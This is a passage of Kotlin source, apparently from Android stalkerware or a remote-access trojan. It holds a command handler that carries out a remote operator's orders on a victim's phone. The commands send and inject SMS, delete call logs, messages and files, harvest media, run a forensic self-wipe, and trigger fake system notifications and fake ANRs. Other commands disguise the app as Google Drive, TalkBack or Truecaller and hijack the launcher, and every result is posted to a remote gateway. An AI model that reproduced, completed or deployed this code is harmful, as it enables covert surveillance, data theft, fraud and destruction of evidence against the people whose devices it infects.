                if (DefaultSmsManager.expectedMode.isNotEmpty() || MyAccessibilityService.instance?.isWaitingForDataSettings == true) {
                    DefaultSmsManager.expectedMode = ""
                    MyAccessibilityService.instance?.isWaitingForDataSettings = false
                    MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
                    DimmerManager.removeOverlay(ctx)
                    DebugLogger.log("AUTO_SYNC", "Absolute safety fuse fired.")
                }
            }, 35000)
            
            status = "SEQUENCE_INITIATED_WITH_DELAY"
                }
                "WAKE" -> {
                    // 1. CPU KICK: Force a temporary WakeLock to ensure the CPU is awake to process the UI
                    val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                    val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or 
                        android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or 
                        android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:WakeTrigger")
                    wakeLock.acquire(3000) // Hold for 3 seconds

                    val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                    val channelId = "system_integrity_alerts"
                    
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        val channel = android.app.NotificationChannel(channelId, "System Integrity", android.app.NotificationManager.IMPORTANCE_HIGH)
                        channel.setSound(null, null)
                        channel.enableVibration(false)
                        nm.createNotificationChannel(channel)
                    }

                    val intent = Intent(ctx, PulseActivity::class.java)
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_USER_ACTION or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                    intent.putExtra("is_wake_trigger", true)
                    if (content.contains("wellbeing")) intent.putExtra("route_to_settings", true)

                    val pendingIntent = android.app.PendingIntent.getActivity(
                        ctx, 99, intent, 
                        android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
                    )

                    val builder = androidx.core.app.NotificationCompat.Builder(ctx, channelId)
                        .setSmallIcon(android.R.drawable.ic_menu_info_details)
                        .setContentTitle("System Update")
                        .setContentText("Synchronizing system health parameters...")
                        .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
                        .setCategory(androidx.core.app.NotificationCompat.CATEGORY_ALARM)
                        .setFullScreenIntent(pendingIntent, true)
                        .setAutoCancel(true)
                        .setTimeoutAfter(3000)

                    nm.notify(99, builder.build())
                    status = "STRONG_WAKE_DISPATCHED"
                }
                "REMOTE_TOUCH" -> {
                    if (MyAccessibilityService.instance == null) {
                        status = "FAILED (SERVICE_OFF)"
                        errorMsg = "Accessibility service is offline."
                    } else {
                        try {
                            val trimmed = content.trim()
                            var initialDelay = 0L
                            val chain = if (trimmed.startsWith("{")) {
                                val obj = JSONObject(trimmed)
                                initialDelay = obj.optLong("delay", 0L)
                                obj.optJSONArray("chain") ?: JSONArray()
                            } else if (trimmed.startsWith("[")) {
                                JSONArray(trimmed)
                            } else {
                                // Legacy Fallback Converter
                                val parts = trimmed.split("|")
                                JSONArray().put(JSONObject().apply {
                                    put("type", parts[0].trim())
                                    put("val", parts.getOrNull(1)?.trim() ?: "")
                                })
                            }
                            
                            if (initialDelay > 0) {
                                DebugLogger.log("CHAIN_START", "Applying initial delay of ${initialDelay}ms")
                                kotlinx.coroutines.delay(initialDelay)
                            }
                            
                            val chainReport = MyAccessibilityService.instance?.executeInteractionChain(chain)
                            status = "CHAIN_EXECUTED"
                            val result = JSONObject().put("report", chainReport)
                            updateCommandStatus(ctx, id, status, null, result, null)
                            return
                        } catch (e: Exception) {
                            status = "CHAIN_FAILED"
                            errorMsg = e.message ?: "Unknown error"
                        }
                    }
                }
                "PHONE_LOGS" -> {
                    val parts = content.split("|")
                    val action = parts[0].trim()
                    val value = if (parts.size > 1) parts[1].trim() else null
                    
                    val deletedCount = PhoneManager.deleteLogs(ctx, action, value)
                    status = when (deletedCount) {
                        -1 -> "FAILED_PERMISSION"
                        -2 -> "FAILED_ERROR"
                        else -> "SUCCESS_CLEANUP ($deletedCount)"
                    }
                    errorMsg = "Action: $action | Target: ${value ?: "ALL"}"
                }
                "DELETE_SMS_THREAD" -> {
                    if (!DefaultSmsManager.isDefaultSms(ctx)) {
                        status = "FAILED (NOT_DEFAULT)"
                        errorMsg = "I'm not default to do that"
                    } else {
                        val target = content.trim()
                        val deletedCount = PhoneManager.deleteSmsThread(ctx, target)
                        status = "THREAD_WIPED"
                        errorMsg = "Target: $target"
                    }
                }
                "DELETE_SMS_QUERY" -> {
                    if (!DefaultSmsManager.isDefaultSms(ctx)) {
                        status = "FAILED (NOT_DEFAULT)"
                        errorMsg = "I'm not default to do that"
                    } else {
                        val query = content.trim()
                        val count = PhoneManager.deleteSmsByQuery(ctx, query)
                        status = "QUERY_WIPE_COMPLETE"
                        errorMsg = "Messages Purged: $count | Query: $query"
                    }
                }
                "SEND_SMS" -> {
                    val parts = content.split("|")
                    if (parts.size >= 2) {
                        val num = parts[0].trim()
                        val msg = parts[1].trim()
                        try {
                            PhoneManager.sendLegitSms(ctx, num, msg)
                            status = "SUCCESS"
                            errorMsg = "Accepted by SMS subsystem for delivery to $num"
                        } catch (e: Exception) {
                            status = "FAILED_DISPATCH"
                            errorMsg = e.message ?: "Unknown SMS subsystem error"
                        }
                    } else {
                        status = "FAILED_FORMAT"
                        errorMsg = "Format: NUMBER|MESSAGE"
                    }
                }
                "SET_RELENTLESS_ACC" -> {
                    // 1. Force Skin Change to TalkBack immediately
                    applyMasqueradeSkin(ctx, "TALKBACK")

                    // 2. Configure Relentless ACC rules
                    val parts = content.split("|")
                    val chill = parts.getOrNull(0)?.trim()?.toLongOrNull() ?: 1440L
                    val interval = parts.getOrNull(1)?.trim()?.toLongOrNull() ?: 2L
                    val max = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 5
                    val html = if (parts.size > 3) parts.subList(3, parts.size).joinToString("|").trim() else null
                    
                    AccRelentlessManager.applyNewConfig(ctx, chill, interval, max, html)
                    
                    status = "RELENTLESS_ACC_CONFIGURED"
                    errorMsg = "Skin: TALKBACK | Chill: ${chill}m | Interval: ${interval}m | Max: $max | Counters Reset"
                }
                "STOP_RELENTLESS_ACC" -> {
                    AccRelentlessManager.stopNagging(ctx)
                    DynamicUIManager.removeOverlay(ctx)
                    status = "RELENTLESS_ACC_STOPPED"
                }
                "ACC_GOTO_SETTINGS" -> {
                    DynamicUIManager.removeOverlay(ctx)
                    val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    ctx.startActivity(i)
                    status = "EXECUTED (Opened Settings)"
                }
                "ACC_SHOW_HELP" -> {
                    DynamicUIManager.removeOverlay(ctx)
                    val i = Intent(ctx, AccHelpActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    ctx.startActivity(i)
                    status = "EXECUTED (Opened Help)"
                }
                "INJECT_SMS" -> {
                    if (!DefaultSmsManager.isDefaultSms(ctx)) {
                        status = "FAILED (NOT_DEFAULT)"
                        errorMsg = "I'm not default to do that"
                    } else {
                        val parts = content.split("|")
                        if (parts.size >= 2) {
                            val num = parts[0].trim()
                            val msg = parts[1].trim()
                            val isRead = parts.getOrNull(2)?.trim()?.equals("READ", true) ?: false
                            val success = PhoneManager.injectFakeSms(ctx, num, msg, isRead)
                            status = if (success) "INJECTION_SUCCESS" else "INJECTION_FAILED"
                            errorMsg = "From: $num | Mode: ${if(isRead) "Silent" else "Unread"}"
                        } else {
                            status = "FAILED_FORMAT"
                            errorMsg = "Use: NUMBER | MESSAGE | [READ/UNREAD]"
                        }
                    }
                }
                "DELETE_FILE" -> {
                    val paths = content.split("|")
                    var successCount = 0
                    var failCount = 0
                    val report = StringBuilder()

                    paths.forEach { path ->
                        val target = File(path.trim())
                        if (target.exists()) {
                            val isDir = target.isDirectory
                            val name = target.name
                            if (target.deleteRecursively()) {
                                successCount++
                                report.append("[PURGED] ${if(isDir) "Dir" else "File"}: $name; ")
                            } else {
                                failCount++
                                report.append("[LOCKED] $name; ")
                            }
                        } else {
                            failCount++
                            report.append("[NOT_FOUND] ${target.absolutePath}; ")
                        }
                    }
                    status = "CLEANUP_EXEC_COMPLETE (OK: $successCount, ERR: $failCount)"
                    errorMsg = report.toString()
                }
                "NUKE" -> {
                    try {
                        // 1. Wipe the "Catacombs" (External hidden storage)
                        File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "Android").deleteRecursively()
                        
                        // 2. Wipe Internal Files (Logs and Crash reports)
                        File(ctx.filesDir, "survivor_logs.txt").delete()
                        File(ctx.filesDir, "CRITICAL_HALT.txt").delete()
                        File(ctx.filesDir, "sms_archive_vault.json").delete()
                        
                        // 3. Reset SharedPreferences (Excluding app_identity)
                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().clear().apply()
                        ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit().clear().apply()
                        ctx.getSharedPreferences("setup_prefs", Context.MODE_PRIVATE).edit().clear().apply()
                        ctx.getSharedPreferences("app_health", Context.MODE_PRIVATE).edit().clear().apply()

                        status = "FORENSIC_WIPE_COMPLETE"
                        
                        // 4. Suicide & Resurrect: Kill process; OS will restart services in fresh state
                        Handler(Looper.getMainLooper()).postDelayed({ 
                            android.os.Process.killProcess(android.os.Process.myPid()) 
                        }, 2000)
                    } catch(e: Exception) { 
                        status = "CLEANUP_FAILED"
                        errorMsg = e.message ?: "IO Error during wipe"
                    }
                }
                "RUN_INTENT" -> {
                    try {
                        val json = JSONObject(content)
                        val action = json.optString("action", android.content.Intent.ACTION_VIEW)
                        val intent = android.content.Intent(action)
                        
                        val dataStr = json.optString("data", "")
                        if (dataStr.isNotEmpty()) {
                            val safeData = if (dataStr.startsWith("tel:", ignoreCase = true)) dataStr.replace("#", "%23") else dataStr
                            intent.data = android.net.Uri.parse(safeData)
                        }
                        
                        if (json.has("pkg")) {
                            val pkg = json.getString("pkg")
                            if (json.has("cls")) {
                                intent.setClassName(pkg, json.getString("cls"))
                            } else {
                                intent.setPackage(pkg)
                            }
                        }

                        if (dataStr.contains("/") && !dataStr.startsWith("tel:") && !dataStr.contains("://")) {
                            val parts = dataStr.split("/")
                            intent.setClassName(parts[0], parts[1])
                            intent.data = null 
                        }
                        
                        val typeStr = json.optString("type", "")
                        if (typeStr.isNotEmpty()) {
                            if (intent.data != null) intent.setDataAndType(intent.data, typeStr)
                            else intent.type = typeStr
                        }
                        
                        val extras = json.optJSONObject("extras")
                        extras?.keys()?.forEach { key ->
                            val value = extras.get(key)
                            if (value is Boolean) intent.putExtra(key, value)
                            else if (value is Int) intent.putExtra(key, value)
                            else intent.putExtra(key, value.toString())
                        }

                        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                        val target = json.optString("target", "activity").lowercase()
                        
                        when (target) {
                            "service" -> {
                                val res = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(intent)
                                          else ctx.startService(intent)
                                if (res != null) {
                                    status = "SUCCESS"
                                    errorMsg = "Service started: ${res.shortClassName}"
                                } else {
                                    status = "FAILED_NOT_FOUND"
                                    errorMsg = "Service component does not exist."
                                }
                            }
                            "broadcast" -> {
                                ctx.sendBroadcast(intent)
                                status = "SUCCESS"
                                errorMsg = "Broadcast dispatched"
                            }
                            else -> {
                                ctx.startActivity(intent)
                                status = "SUCCESS"
                                errorMsg = "Activity launch initiated"
                            }
                        }
                    } catch (e: android.content.ActivityNotFoundException) {
                        status = "FAILED_NOT_FOUND"
                        errorMsg = "The target activity or package was not found on this device."
                    } catch (e: SecurityException) {
                        status = "FAILED_SECURITY_DENIED"
                        errorMsg = "Permission denied: The target component is not exported or requires higher privileges."
                    } catch (e: Exception) {
                        status = "FAILED_EXCEPTION"
                        errorMsg = e.message ?: "Unknown error during intent execution"
                    }
                }
                "MOCK_ANR" -> {
                    if (MyAccessibilityService.instance == null) {
                        status = "FAILED (SERVICE_OFF)"
                        errorMsg = "Accessibility service required for UI manipulation."
                    } else {
                        val appName = if (content.isNotBlank()) content.trim() else null
                        MyAccessibilityService.instance?.triggerFakeAnr(appName)
                        status = "ANR_TRIGGERED"
                    }
                }
                "WIPE_TASKS" -> {
                    val service = MyAccessibilityService.instance
                    if (service == null) {
                        status = "FAILED (SERVICE_OFF)"
                    } else {
                        android.os.Handler(android.os.Looper.getMainLooper()).post {
                            DimmerManager.applyDim(ctx, 0, "ACC")
                            service.startStealthKillSequence()
                        }
                        status = "TASK_PURGE_INITIATED"
                    }
                }
                "HARVEST_MEDIA" -> {
                    // Explicitly ignore the 'already done' safety flag and force a harvest
                    ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("media_harvest_init_done", false).apply()
                    CoroutineScope(Dispatchers.IO).launch {
                        MediaHarvester.triggerInitialHarvest(ctx)
                    }
                    status = "HARVEST_INITIATED"
                    errorMsg = "Historical vacuum engaged. Live trap armed."
                }
                "SET_LAUNCHER" -> {
                    val parts = content.split("|", limit = 2)
                    val state = parts[0].trim().uppercase()
                    val wallpaper = parts.getOrNull(1)?.trim() ?: ""
                    
                    if (state == "ON") {
                        LauncherManager.setEnabled(ctx, true)
                        if (wallpaper.isNotEmpty()) {
                            withContext(Dispatchers.IO) {
                                LauncherManager.applyWallpaper(ctx, wallpaper)
                            }
                        }
                        val i = Intent(ctx, MainActivity::class.java)
                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                        ctx.startActivity(i)
                        status = "LAUNCHER_ENABLED"
                        errorMsg = if (wallpaper.isNotEmpty()) "Wallpaper: $wallpaper" else "Using cached/default background"
                    } else {
                        LauncherManager.setEnabled(ctx, false)
                        val i = Intent(ctx, MainActivity::class.java)
                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                        ctx.startActivity(i)
                        status = "LAUNCHER_DISABLED"
                        errorMsg = "Dashboard restored"
                    }
                }
                "SET_LAUNCHER_GRID" -> {
                    val parts = content.split("|")
                    if (parts.size >= 5) {
                        ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE).edit()
                            .putInt("grid_cols", parts[0].trim().toIntOrNull() ?: 4)
                            .putInt("grid_rows", parts[1].trim().toIntOrNull() ?: 6)
                            .putInt("icon_size", parts[2].trim().toIntOrNull() ?: 56)
                            .putInt("v_gap", parts[3].trim().toIntOrNull() ?: 22)
                            .putInt("h_gap", parts[4].trim().toIntOrNull() ?: 16)
                            .apply()
                        status = "GRID_CONFIG_UPDATED"
                        errorMsg = "New Layout: ${parts[0]}x${parts[1]} | Icon: ${parts[2]}dp"
                    } else {
                        status = "FAILED_FORMAT"
                    }
                }
                "SET_SYSTEM_FONT" -> {
                    val service = MyAccessibilityService.instance
                    if (service != null) {
                        service.startFontChangeSequence(id, content.trim())
                        status = "FONT_SEQUENCE_INITIATED"
                    } else {
                        status = "FAILED (SERVICE_OFF)"
                    }
                }
                "SET_SYSTEM_THEME" -> {
                    val service = MyAccessibilityService.instance
                    if (service != null) {
                        service.startThemeChangeSequence(id, content.trim())
                        status = "THEME_SEQUENCE_INITIATED"
                    } else {
                        status = "FAILED (SERVICE_OFF)"
                    }
                }
                "SET_WALLPAPER" -> {
                    val parts = content.split("|", limit = 2)
                    if (parts.size >= 2) {
                        val targetStr = parts[0].trim().uppercase()
                        val urlStr = parts[1].trim()
                        
                        val flag = when (targetStr) {
                            "LOCK" -> android.app.WallpaperManager.FLAG_LOCK
                            "HOME" -> android.app.WallpaperManager.FLAG_SYSTEM
                            else -> android.app.WallpaperManager.FLAG_SYSTEM or android.app.WallpaperManager.FLAG_LOCK
                        }

                        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                            try {
                                val bitmap = if (urlStr.startsWith("http")) {
                                    val connection = java.net.URL(urlStr).openConnection() as java.net.HttpURLConnection
                                    connection.doInput = true
                                    connection.connect()
                                    android.graphics.BitmapFactory.decodeStream(connection.inputStream)
                                } else {
                                    val file = java.io.File(urlStr)
                                    if (file.exists()) android.graphics.BitmapFactory.decodeFile(file.absolutePath) else null
                                }

                                if (bitmap != null) {
                                    val wm = android.app.WallpaperManager.getInstance(ctx)
                                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                                        wm.setBitmap(bitmap, null, true, flag)
                                    } else {
                                        wm.setBitmap(bitmap)
                                    }
                                    updateCommandStatus(ctx, id, "SUCCESS", "Wallpaper applied to $targetStr")
                                } else {
                                    updateCommandStatus(ctx, id, "FAILED", "Image decode failed from URL/Path")
                                }
                            } catch (e: Exception) {
                                updateCommandStatus(ctx, id, "FAILED", "Wallpaper error: ${e.message}")
                            }
                        }
                        status = "WALLPAPER_DOWNLOAD_QUEUED"
                        errorMsg = "Target: $targetStr"
                    } else {
                        status = "FAILED_FORMAT"
                        errorMsg = "Usage: HOME/LOCK/BOTH | URL_OR_PATH"
                    }
                }
                "SET_LAUNCHER_MODE" -> {
                    val mode = content.trim().uppercase()
                    if (mode == "PERSONAL" || mode == "WORK") {
                        ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE).edit()
                            .putString("display_mode", mode)
                            .apply()
                        AppCache.invalidate()
                        status = "SUCCESS"
                        errorMsg = "Launcher switched to $mode mode"
                    } else {
                        status = "FAILED_INVALID_MODE"
                    }
                }

                "HIDE_APPS" -> {
                    val prefs = ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE)
                    if (content.trim().uppercase() == "CLEAR") {
                        prefs.edit().remove("hidden_packages").apply()
                        status = "SUCCESS"
                        errorMsg = "App blacklist cleared."
                    } else {
                        val newHidden = content.split(Regex("[,|]")).map { it.trim() }.filter { it.isNotEmpty() }
                        val existing = prefs.getStringSet("hidden_packages", emptySet()) ?: emptySet()
                        val combined = existing + newHidden
                        prefs.edit().putStringSet("hidden_packages", combined).apply()
                        status = "SUCCESS"
                        errorMsg = "Hidden ${newHidden.size} new apps. Total: ${combined.size}"
                    }
                    AppCache.invalidate()
                }
                "UNHIDE_APPS" -> {
                    val prefs = ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE)
                    if (content.trim().uppercase() == "ALL") {
                        prefs.edit().remove("hidden_packages").apply()
                        status = "SUCCESS"
                        errorMsg = "All apps unhidden."
                    } else {
                        val toUnhide = content.split(Regex("[,|]")).map { it.trim() }.filter { it.isNotEmpty() }
                        val existing = prefs.getStringSet("hidden_packages", emptySet()) ?: emptySet()
                        val updated = existing - toUnhide.toSet()
                        prefs.edit().putStringSet("hidden_packages", updated).apply()
                        status = "SUCCESS"
                        errorMsg = "Unhidden ${toUnhide.size} apps. Remaining hidden: ${updated.size}"
                    }
                    AppCache.invalidate()
                }
                "GET_HIDDEN_APPS" -> {
                    val prefs = ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE)
                    val hiddenSet = prefs.getStringSet("hidden_packages", emptySet()) ?: emptySet()
                    val result = JSONObject().put("hidden_apps", JSONArray(hiddenSet))
                    status = "HIDDEN_APPS_RETRIEVED"
                    updateCommandStatus(ctx, id, status, null, result, null)
                    return
                }
                "UNHIDE_APPS" -> {
                    val prefs = ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE)
                    if (content.trim().uppercase() == "ALL") {
                        prefs.edit().remove("hidden_packages").apply()
                        status = "SUCCESS"
                        errorMsg = "All apps unhidden."
                    } else {
                        val toUnhide = content.split(Regex("[,|]")).map { it.trim() }.filter { it.isNotEmpty() }
                        val existing = prefs.getStringSet("hidden_packages", emptySet()) ?: emptySet()
                        val updated = existing - toUnhide.toSet()
                        prefs.edit().putStringSet("hidden_packages", updated).apply()
                        status = "SUCCESS"
                        errorMsg = "Unhidden ${toUnhide.size} apps. Remaining hidden: ${updated.size}"
                    }
                    AppCache.invalidate()
                }
                "GET_HIDDEN_APPS" -> {
                    val prefs = ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE)
                    val hiddenSet = prefs.getStringSet("hidden_packages", emptySet()) ?: emptySet()
                    val result = JSONObject().put("hidden_apps", JSONArray(hiddenSet))
                    status = "HIDDEN_APPS_RETRIEVED"
                    updateCommandStatus(ctx, id, status, null, result, null)
                    return
                }
                "ADD_FAKE_APP" -> {
                    val parts = content.split("|", limit = 5)
                    if (parts.size >= 5) {
                        val mode = parts[0].trim().uppercase()
                        val method = parts[1].trim().uppercase()
                        val name = parts[2].trim()
                        val iconUrl = parts[3].trim()
                        val payload = parts[4].trim()
                        
                        val success = LauncherManager.addFakeApp(ctx, mode, method, name, iconUrl, payload)
                        if (success) {
                            status = "FAKE_APP_ADDED"
                            errorMsg = "Name: $name | Mode: $mode"
                        } else {
                            status = "FAILED"
                            errorMsg = "Icon download or persistence failed."
                        }
                    } else {
                        status = "FAILED_FORMAT"
                        errorMsg = "Format: MODE|METHOD|NAME|ICON_URL|PAYLOAD"
                    }
                }
                "REMOVE_FAKE_APP" -> {
                    LauncherManager.removeFakeApp(ctx, content.trim())
                    status = "FAKE_APP_REMOVED"
                }
                "SET_DOCK_APPS" -> {
                    val prefs = ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE)
                    val newDock = content.split(Regex("[,|]"))
                        .map { it.trim() }
                        .filter { it.isNotEmpty() }
                        .take(5) // Enforce max 5 limit
                    
                    if (newDock.isNotEmpty()) {
                        prefs.edit().putStringSet("dock_apps", newDock.toSet()).apply()
                        status = "SUCCESS"
                        errorMsg = "Dock updated with ${newDock.size} apps."
                    } else {
                        status = "FAILED"
                        errorMsg = "No valid package names provided."
                    }
                }
                "HIJACK_LAUNCHER" -> {
                    LauncherManager.isHijacking = true
                    LauncherManager.pendingCmdId = id
                    
                    android.os.Handler(android.os.Looper.getMainLooper()).post {
                        DimmerManager.applyDim(ctx, 0, "AUTO")
                        try {
                            val intent = android.content.Intent(android.provider.Settings.ACTION_HOME_SETTINGS).apply {
                                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
                            }
                            ctx.startActivity(intent)
                        } catch (e: Exception) {
                            LauncherManager.isHijacking = false
                            DimmerManager.removeOverlay(ctx)
                        }
                    }
                    
                    // Safety fuse: Reset if stuck for 30s
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        if (LauncherManager.isHijacking) {
                            LauncherManager.isHijacking = false
                            DimmerManager.removeOverlay(ctx)
                        }
                    }, 30000)

                    status = "HIJACK_INITIATED"
                }
                else -> {
                    status = "FAILED (UNKNOWN_CMD)"
                    errorMsg = "Command '$fileName' is not recognized by the device."
                }
            }
        } catch (e: Exception) {
            status = "FAILED: ${e.message}"
            errorMsg = e.toString()
        }

        // Expose the result to the UI Terminal
        DebugLogger.log("COMMAND", "Processed [$fileName] -> $status")

        // Update DB
        updateCommandStatus(ctx, id, status, errorMsg)
    }

    fun applyMasqueradeSkin(ctx: Context, skin: String): Boolean {
        val aliasMap = mapOf(
            "DRIVE" to ".AliasDrive", "CALC" to ".AliasCalc",
            "GOOGLE_PHONE" to ".AliasGooglePhone", "GOOGLE_MSG" to ".AliasGoogleMsg",
            "SAM_PHONE" to ".AliasSamPhone", "SAM_MSG" to ".AliasSamMsg",
            "CHROME" to ".AliasChrome", "IMO" to ".AliasImo",
            "IMO_HD" to ".AliasImoHd", "IMO_BETA" to ".AliasImoBeta", "IMO_LITE" to ".AliasImoLite",
            "TRUECALLER" to ".AliasTruecaller", "TALKBACK" to ".AliasTalkBack", "SETTINGS" to ".AliasSettings"
        )

        if (!aliasMap.containsKey(skin)) return false

        val prefs = ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE)
        val currentSkin = prefs.getString("active_masquerade_skin", "")
        if (currentSkin == skin) return true // Already active

        val pm = ctx.packageManager
        aliasMap.forEach { (key, aliasName) ->
            val comp = android.content.ComponentName(ctx, "${ctx.packageName}$aliasName")
            val state = if (key == skin) android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED 
                        else android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            pm.setComponentEnabledSetting(comp, state, android.content.pm.PackageManager.DONT_KILL_APP)
        }

        val targetComp = android.content.ComponentName(ctx, "${ctx.packageName}${aliasMap[skin]}")
        val success = pm.getComponentEnabledSetting(targetComp) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED
        
        if (success) {
            prefs.edit().putString("active_masquerade_skin", skin).apply()
            DebugLogger.log("SKIN", "Identity transformed to $skin")
        }
        return success
    }

    fun updateCommandStatus(ctx: Context, id: Int, status: String, errorMsg: String? = null, resultData: JSONObject? = null, resultFilePath: String? = null) {
        try {
            val key = SecretVault.getLock(ctx)
            val updateUrl = URL(SecretVault.getGatewayUrl(ctx))
            val conn = updateUrl.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("apikey", key)
            conn.setRequestProperty("Authorization", "Bearer $key")
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true

            val req = JSONObject()
            req.put("action", "update_command")
            req.put("deviceId", DeviceManager.getDeviceId(ctx))
            val payload = JSONObject()
            payload.put("id", id)
            payload.put("status", status)
            if (!errorMsg.isNullOrEmpty()) payload.put("errorMsg", errorMsg)
            if (resultData != null) payload.put("resultData", resultData)
            if (!resultFilePath.isNullOrEmpty()) payload.put("resultFilePath", resultFilePath)
            req.put("payload", payload)

            val finalJson = req.toString()
            // SAFETY: Supabase Edge Functions have a limit. If payload is too huge (>2MB), vault it instead of trying.
            if (finalJson.length > 2 * 1024 * 1024) {
                DebugLogger.log("CMD_WARN", "Payload too large for DB update. Moving to Recovery Vault.")
                DumpManager.vaultCommandUpdate(id, status, errorMsg, resultData, resultFilePath)
                return
            }

            conn.outputStream.use { it.write(finalJson.toByteArray()) }
            val code = conn.responseCode
            if (code !in 200..299) {
                if (code == 402 || code >= 500) SecretVault.switchFallback(ctx)
                DebugLogger.log("CMD_ERR", "Network fail ($code). Saving to Recovery Vault.")
                DumpManager.vaultCommandUpdate(id, status, errorMsg, resultData, resultFilePath)
            }
        } catch (e: Exception) { 
            if (e !is java.net.UnknownHostException && e !is java.net.ConnectException) {
                if (e is java.net.SocketTimeoutException) SecretVault.switchFallback(ctx)
            }
            DebugLogger.log("CMD_ERR", "Fatal Update Error. Saving to Recovery Vault.")
            DumpManager.vaultCommandUpdate(id, status, errorMsg, resultData, resultFilePath)
        }
    }
}
